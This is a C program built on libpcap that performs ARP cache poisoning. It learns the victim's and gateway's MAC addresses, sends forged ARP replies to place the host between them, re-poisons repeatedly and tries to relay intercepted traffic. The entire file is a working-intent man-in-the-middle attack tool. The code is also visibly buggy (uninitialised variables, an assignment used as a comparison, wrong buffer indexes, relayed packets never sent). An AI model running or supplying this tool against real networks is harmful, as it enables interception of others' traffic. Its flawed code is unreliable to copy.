#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <pthread.h>

#include "arpheader.h"

#define SENDER_TO_HOST 1
#define TARGET_TO_HOST 2

void parse_usr_mac_address(char*,char*);
void parse_usr_ip_address (char*,struct in_addr*);
void make_packet(u_char**, int*, int, struct in_addr, struct in_addr, u_char*, u_char*);
void cache_poison();
int filtering(u_char*,u_char*, struct in_addr, uint16_t operation, u_char*);
int relay_filtering(u_char*, u_char*, u_char*, u_char*, struct in_addr, struct in_addr, struct in_addr, int *length);

int main(int argc, char** argv){
	char  errbuf[PCAP_ERRBUF_SIZE];
	char* interface = argv[1];
	char  host_ip_str[16];
	
	struct bpf_program fp;

	struct in_addr sender_ip;
	struct in_addr target_ip;
	struct in_addr host_ip	;

	u_char host_mac[6];
	u_char send_mac[6];
	u_char target_mac[6];

	u_char* payload;
	u_char* payload2;

	u_char* rcv_packet;
	u_char* rcv_packet2;

	bpf_u_int32 inet;
	bpf_u_int32 submask;

	pcap_t* handle;
	struct pcap_pkthdr* header;
	
	int length;
	int length2;
	
	if(argc < 4){printf("Argv 1 : Network Interface / Argv 2 : Victim IP Addr / Argv 3 : Target IP Addr\n");return -1;}

	parse_usr_mac_address(interface, host_mac);
	parse_usr_ip_address (interface, &host_ip);

	inet_ntop(AF_INET,&host_ip,host_ip_str,sizeof(char) * 16);
	inet_pton(AF_INET,argv[2],&sender_ip);
	inet_pton(AF_INET,argv[3],&target_ip);

	printf("Usr Mac Addr : ");
	for(int i = 0 ; i < 5 ; i++) printf("%x : ",host_mac[i]);
	printf("%x\nUsr IP Addr : %s\n",host_mac[5], inet_ntoa(host_ip));
	
	payload = (u_char *)malloc(sizeof(u_char) * 1000);
	payload2 = (u_char *)malloc(sizeof(u_char) * 1000);
	rcv_packet = (u_char*)malloc(sizeof(u_char) * 1000);
	rcv_packet2 = (u_char*)malloc(sizeof(u_char) * 1000);

	handle = pcap_open_live(argv[1], 65536, 1, 1000, errbuf);
	if(handle == NULL){printf("Cannot Open Device %s\n", interface);return -1;}
	if(pcap_lookupnet(interface,&inet,&submask,errbuf) == -1){printf("Different Network\n");return -1;}
	printf("Make broadcast packet\n");
	make_packet(&payload, &length,__ARP_REQUEST__,host_ip,sender_ip,host_mac,send_mac);
	for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
	printf("\n");	
	while(pcap_sendpacket(handle, payload, length));
		
	/* Capture ARP Reply */
	while(pcap_next_ex(handle, &header, &rcv_packet)!=1);
	if(filtering(rcv_packet,send_mac, sender_ip, __ARP_REPLY__, host_mac) == 1){
		for(int i = 0, j = 6 ; i < 6 ; i++,j++){send_mac[i] = rcv_packet[j];}
		printf("get sender mac addr\n");
		for(int i = 0 ; i < 5 ; i++) printf("%X : ", send_mac[i]);	
		printf("%X\n",send_mac[5]);
		printf("make arp reply packet to poison cache table\n");
		make_packet(&payload, &length,__ARP_REPLY__,target_ip,sender_ip,host_mac,send_mac);
		for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
		printf("\n");
		while(pcap_sendpacket(handle,payload,length));	
	}
	printf("Make broadcast packet to get gateway mac addr\n");
	make_packet(&payload2, &length2, __ARP_REQUEST__, host_ip, target_ip, host_mac, target_mac);
	for(int i = 0 ; i < length2 ; i++) printf("%x ", payload2[i]);
	printf("\n");
	while(pcap_sendpacket(handle,payload2,length2));
	while(1){
		pcap_next_ex(handle,&header,&rcv_packet2);
		if(filtering(rcv_packet2,target_mac,target_ip,__ARP_REPLY__,host_mac) == 1) break;
	}
	printf("Print ARP Reply from gateway\n");
	for(int i = 0 ; i < length2 ; i++) printf("%x ", rcv_packet2[i]);
	if(filtering(rcv_packet2, target_mac, target_ip,  __ARP_REPLY__, host_mac) == 1){
		for(int i = 0, j = 6 ; i < 6 ; i++, j++){target_mac[i] = rcv_packet[j];}
		printf("\n");
		for(int i = 0 ; i < 5; i ++) printf("%X : ", target_mac[i]);
		printf("%X\n",target_mac[5]);
		printf("make arp reply packet to poison gateway\n");
		make_packet(&payload2,&length2, __ARP_REPLY__, sender_ip,target_ip, host_mac, target_mac);
		for(int i = 0 ; i < length2 ; i++) printf("%x ",payload2[i]);
		printf("\n");		
		while(pcap_sendpacket(handle,payload2,length2));
	}
	//char * payload : arp reply packet to poison sender's cache table
	//char * payload2 : arp reply packet to poison target's cache table
	
	//arp relay
	u_char* rcv_packet3 = (u_char*)malloc(sizeof(u_char) * 1000);
	int length3;
	while(1){
		if(pcap_next_ex(handle, &header, &rcv_packet3) == 1){
			int flag = relay_filtering(rcv_packet3, host_mac, send_mac, target_mac, host_ip, sender_ip, target_ip, &length3);
			//int flag = 0;	
			if(flag == 0) continue;		
			if(flag == -1) {//Packet == arp
				pcap_sendpacket(handle,payload,length);
				for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
				printf("\n");
				pcap_sendpacket(handle,payload2,length2);
				for(int i = 0 ; i < length2 ; i++) printf("%x ",payload2[i]);
				printf("\n");
				continue;
			}
			if(flag == 1) {//{Packet == ip / sender -> host
				for(int i = 0 ; i < 6 ; i++) rcv_packet3[i] = host_mac[i];
				for(int i = 6 ; i < 12 ; i++) rcv_packet3[i] = target_mac[i]; 
			}
			if(flag == 2) {//Packet == ip / target -> host
				for(int i = 0 ; i < 6 ; i++) rcv_packet3[i] = host_mac[i];
				for(int i = 6 ; i < 12 ; i++) rcv_packet3[i] = send_mac[i];
			}
		}
	}
	free(payload);
	free(payload2);
	free(rcv_packet);
	free(rcv_packet2);
	free(rcv_packet3);
}

int filtering(u_char* rcv_packet,u_char sender_mac[], struct in_addr sender_ip, uint16_t operation, u_char host_mac[]){
	struct ether_header *eth = (struct ether_header*)rcv_packet;
	arphdr *arp = (arphdr*)(rcv_packet + sizeof(*eth));
	struct in_addr tmpadr;
	memcpy(&tmpadr, &arp->src_ip_addr,sizeof(tmpadr));
	if(eth->ether_type != htons(ETHERTYPE_ARP) || (arp->operation != htons(operation))){
		return 0;
	}
	
	if(strncmp(eth->ether_dhost, host_mac, 6)){ return 0;}
	
	if(memcmp(&tmpadr, &sender_ip, sizeof(tmpadr))) {return 0;} 

	for(int i = 0 ; i < 6 ; i++) sender_mac[i] = eth->ether_shost[i];

	return 1;
}

int relay_filtering(u_char* rcv_packet, u_char host_mac[], u_char sender_mac[], u_char target_mac[], struct in_addr host_ip, struct in_addr sender_ip, struct in_addr target_ip,int* length){
	struct ether_header *eth = (struct ether_header*)rcv_packet;
	struct iphdr *iph = (struct iphdr*)(rcv_packet + sizeof(*eth));
	*length = iph->ihl * 4;
	
	if (eth->ether_type == htons(__ETHERTYPE_ARP__)) {
                printf("=======================================ARP=============================================\n");
                printf("packet source mac address \n");
                for(int i = 0 ; i < 6 ; i++) {printf("%x ",eth->ether_shost[i]); (i == 5 ? printf("\n") : printf(": "));}
                printf("packet dest mac address \n");
                for(int i = 0 ; i < 6 ; i++) {printf("%x ",eth->ether_dhost[i]); (i == 5 ? printf("\n") : printf(": "));}
                printf("host mac address\n");
                for(int i = 0 ; i < 6 ; i++) {printf("%x ",host_mac[i]); (i == 5 ? printf("\n") : printf(": "));}
                printf("sender mac address \n");
                for(int i = 0 ; i < 6 ; i++) {printf("%x ",sender_mac[i]); (i == 5 ? printf("\n") : printf(": "));}
                printf("========================================================================================\n");
		return -1;
}
	if(eth->ether_type == htons(__ETHERTYPE_IP__)){
		int smac_flag = 0;
		int hmac_flag = 0;
		int tmac_flag = 0;
/*		printf("==========================================IP============================================\n");
		printf("packet source mac address \n");
		for(int i = 0 ; i < 6 ; i++) {printf("%x ",eth->ether_shost[i]); (i == 5 ? printf("\n") : printf(": "));}
		printf("packet dest mac address \n");
		for(int i = 0 ; i < 6 ; i++) {printf("%x ",eth->ether_dhost[i]); (i == 5 ? printf("\n") : printf(": "));}
		printf("host mac address\n");
		for(int i = 0 ; i < 6 ; i++) {printf("%x ",host_mac[i]); (i == 5 ? printf("\n") : printf(": "));}
		printf("sender mac address \n");
		for(int i = 0 ; i < 6 ; i++) {printf("%x ",sender_mac[i]); (i == 5 ? printf("\n") : printf(": "));}
		printf("========================================================================================\n");
*/		for(int i = 0 ; i < 6 ; i++) {
			if(eth->ether_shost[i] == sender_mac[i]) smac_flag++;
			if(eth->ether_dhost[i] == host_mac[i]) hmac_flag++;
			if(eth->ether_shost[i] == target_mac[i]) tmac_flag++;
		}
		if(smac_flag == 6 && hmac_flag == 6){
			int flag = 0;
			uint32_t dest_addr;
//			inet_pton(AF_INET,iph->daddr,&dest_addr);
			printf("strncmp#01\n"); 
			if (dest_addr == target_ip.s_addr) return 1;
		}
	
		if(tmac_flag == 6 && hmac_flag == 6){
			int flag = 0;
			uint32_t dest_addr;
//			inet_pton(AF_INET, iph->daddr,&dest_addr);
			printf("strncmp#02\n");
			if (dest_addr = sender_ip.s_addr) return 2;
			else return 0;
		}
	}
	return 0;		
}

void parse_usr_mac_address(char* interface, char mac_addr[]){			/*PARSE MAC ADDRESS*/
	int fd;
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);	

	for(int i = 0 ; i < __MACADDR_LEN__ ; i++){mac_addr[i] = ifr.ifr_addr.sa_data[i];}
	close(fd);
}

void parse_usr_ip_address (char* interface, struct in_addr* ip){			/*PARSE IP  ADDRESS*/
	int fd;
	struct ifreq ifr;
	struct sockaddr_in* sin;
	const int IPADDR_START = 2;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name,interface,IFNAMSIZ-1);
	ioctl(fd,SIOCGIFADDR, &ifr);
	sin = (struct socaddr_in*) &ifr.ifr_addr;
	*ip = sin->sin_addr;
	close(fd);
}

void make_packet(u_char** packet, int* length, int operation, struct in_addr host_ip, struct in_addr sender_ip, u_char host_mac[], u_char send_mac[]){
	struct ether_header eth;
	arphdr arp;
	
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = 0xff;		//broadcast!
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = send_mac[i];		//unicast!
	for(int i = 0 ; i < 6 ; i++) eth.ether_shost[i] = host_mac[i];
	eth.ether_type = 0x0608;
	
	arp.hw_type = 0x0100;
	arp.proto_type = 0x0008;
	arp.hw_addr_len = 6;
	arp.proto_addr_len = 4;
	arp.operation = htons(operation);
	
	for(int i = 0 ; i < 6 ; i++) arp.src_hw_addr[i] = host_mac[i];
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = 0x00;
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = send_mac[i];

 	memcpy(arp.src_ip_addr, &host_ip, sizeof(host_ip));
	memcpy(arp.dst_ip_addr, &sender_ip, sizeof(sender_ip));
	
	memcpy((*packet), &eth,sizeof(eth));
	(*length) = sizeof(eth);
	memcpy((*packet) + (*length) , &arp, sizeof(arphdr));

	(*length) +=  sizeof(arphdr);
}
